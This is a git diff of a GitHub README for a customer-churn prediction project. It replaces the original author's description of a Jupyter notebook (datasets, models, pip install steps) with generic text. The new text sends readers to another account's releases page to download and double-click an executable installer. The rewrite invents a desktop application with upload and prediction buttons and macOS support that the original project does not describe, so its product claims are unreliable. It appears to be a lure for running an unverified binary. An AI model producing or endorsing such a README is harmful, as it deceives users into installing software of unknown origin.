@@ -1,99 +1,98 @@
-# 📉 Customer Churn Prediction Using Machine Learning
-## 📌 Project Overview
-Customer churn is a critical challenge for subscription-based businesses.
+# 📊 Customer-Churn-Prediction - Predict Customer Retention Easily
 
-This project builds an end-to-end machine learning pipeline to predict customer churn and identify key factors contributing to customer attrition.
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue)](https://github.com/Sanithu16684/Customer-Churn-Prediction/releases)
 
-The goal is to help businesses proactively retain customers by using data-driven insights.
+## 📚 Description
 
-This project uses separate training and testing datasets to ensure proper model evaluation.
+Customer-Churn-Prediction is a project designed to help businesses understand when customers may leave. By analyzing historical customer data, it uses machine learning to predict churn. This application offers simple tools for data preprocessing, exploration, and model building. It empowers businesses to identify at-risk customers and take action before they leave.
 
-## 🎯 Objectives
-- Analyze customer behavior and churn patterns
-- Perform exploratory data analysis (EDA)
-- Engineer and preprocess features
-- Build and compare machine learning models
-- Evaluate models using appropriate metrics
-- Derive actionable business insights
+## 🚀 Getting Started
 
-## 📊 Dataset
-- Two datasets are used in this project:
-  - `customer_churn_dataset-training-master.csv`
-  - `customer_churn_dataset-testing-master.csv`
-- The datasets contain customer demographic, subscription, and usage information
-- Target variable: **Churn** (1 = Churned, 0 = Retained)
-- Includes both numerical and categorical features
+Follow these steps to download and run the Customer-Churn-Prediction application.
 
-## 🛠️ Technologies & Libraries
-- Python - Programming Language
-- Pandas & NumPy – Data manipulation
-- Matplotlib & Seaborn – Data visualization
-- Scikit-learn – Machine learning models & evaluation
+### 📦 System Requirements
 
-## 🔍 Exploratory Data Analysis (EDA)
-Key analyses performed:
-- Churn distribution analysis
-- Churn rate by contract length
-- Feature correlation analysis
-- Identification of high-risk customer segments
+1. **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent version of Linux.
+2. **Memory:** At least 4 GB of RAM.
+3. **Storage:** Minimum of 200 MB of free disk space.
+4. **Internet Connection:** Required for downloading the application and accessing data.
 
-## ⚙️ Data Preprocessing
-- Converted categorical variables into numerical format using one-hot encoding
-- Standardized numerical features to ensure consistent model performance
-- Split data into training, validation, and testing sets for reliable evaluation
-- Ensured feature consistency between training and testing datasets after encoding
+### 🔗 Download & Install
 
-## 🤖 Models Implemented
-- Logistic Regression
-- Random Forest Classifier
+1. **Download the Application:**
+   Visit the following link to download the latest version of Customer-Churn-Prediction: [Download Latest Release](https://github.com/Sanithu16684/Customer-Churn-Prediction/releases).
 
-Both models were evaluated and compared using:
-- Accuracy
-- Precision
-- Recall
-- ROC-AUC Score
-- Confusion Matrix
-- ROC Curve Visualization
+2. **Installation Steps:**
+   - Navigate to your `Downloads` folder once the file finishes downloading.
+   - Look for the downloaded file name, something like `CustomerChurnPrediction.exe`.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen prompts to complete the installation.
 
-## 📈 Model Evaluation
-- ROC curves were plotted for model comparison
-- Random Forest achieved a strong predictive performance
-- Feature importance analysis highlighted key churn drivers
+3. **Launch the Application:**
+   - After installation, find the application in your Start Menu (Windows) or in the Applications folder (macOS).
+   - Click on the application icon to launch it.
 
-## 💡 Key Business Insights
-- Customers with short-term or month-to-month contracts show higher churn rates
-- Certain subscription types are more prone to churn
-- Contract duration and service usage play a major role in retention
+## 🛠️ How to Use
 
-## 🧠 Conclusion
-This project demonstrates how machine learning can be applied to:
-- Predict customer churn effectively
-- Identify high-risk customers
-- Support business decisions with actionable insights
+Once you have installed and opened the application, you will see a user-friendly interface. 
 
-## ▶️ How to Run the Project
-1. Clone the repository
+1. **Load Data:**
+   - Click on the "Upload Data" button.
+   - Select your CSV file containing customer details.
 
-2. Install required libraries:
-   ```bash
-   pip install pandas numpy matplotlib seaborn scikit-learn
+2. **Analyze Data:**
+   - The program will automatically guide you through preprocessing steps. Follow the prompts to clean and prepare your data.
 
-3. Open the notebook:
-   ```bash
-   Customer Churn Prediction.ipynb
+3. **Run Predictions:**
+   - Choose the "Predict Churn" option.
+   - Hit the "Start Prediction" button. The application will process the data and show you the results.
 
-4. Ensure the following files are in the same directory:
-   - customer_churn_dataset-training-master.csv
-   - customer_churn_dataset-testing-master.csv
-     
-5. Run all cells sequentially
+4. **Review Results:**
+   - Check the output for insights. You will see which customers are likely to churn and why.
 
-## 👤 Author
+## 📊 Features
 
-#### Soundharya Sundaram Iyer
-#### Aspiring Data Scientist / Passionate about Machine Learning 
+- **User-Friendly Interface:** Easy navigation for non-technical users.
+- **Data Visualization:** Graphs and charts to visualize customer data.
+- **Predictive Models:** Built-in machine learning algorithms for accurate predictions.
+- **Export Results:** Save your results as CSV files for further analysis.
 
-### 📌 Feel free to connect with me on LinkedIn and explore more projects on GitHub.
-### If you like this project, feel free to ⭐ star it!!!!!
+## 📈 Evaluation Metrics
 
+Understanding how well the application works is crucial. Customer-Churn-Prediction uses the following metrics to measure accuracy:
 
+- **Accuracy:** Percentage of correct predictions.
+- **Precision:** Ratio of true positive results to all positive results.
+- **Recall:** Ratio of true positive results to all actual positives.
+
+## ❓ Frequently Asked Questions
+
+### How do I know if my data format is correct?
+
+Your data should be in CSV format with headers that label each column, such as `CustomerID`, `Churn`, and any other relevant details. 
+
+### What types of data can I analyze?
+
+You can upload data about customer demographics, transactions, and previous interactions with your business.
+
+### Can I run the application on a Mac?
+
+Yes, Customer-Churn-Prediction is compatible with macOS versions Mojave and higher.
+
+## 🗨️ Support and Contribution
+
+If you encounter any issues or have suggestions for improvement, please open an issue on the GitHub repository. Your feedback helps us improve the application.
+
+### Key Topics
+- Data Analysis
+- Data Prediction
+- Data Science
+- Data Visualization
+- Evaluation Metrics
+- Machine Learning Algorithms
+
+For more information and to stay updated, visit the [repository](https://github.com/Sanithu16684/Customer-Churn-Prediction).
+
+## 🥳 Thanks for using Customer-Churn-Prediction! 
+
+We hope this tool brings valuable insights to your business. Happy analyzing!
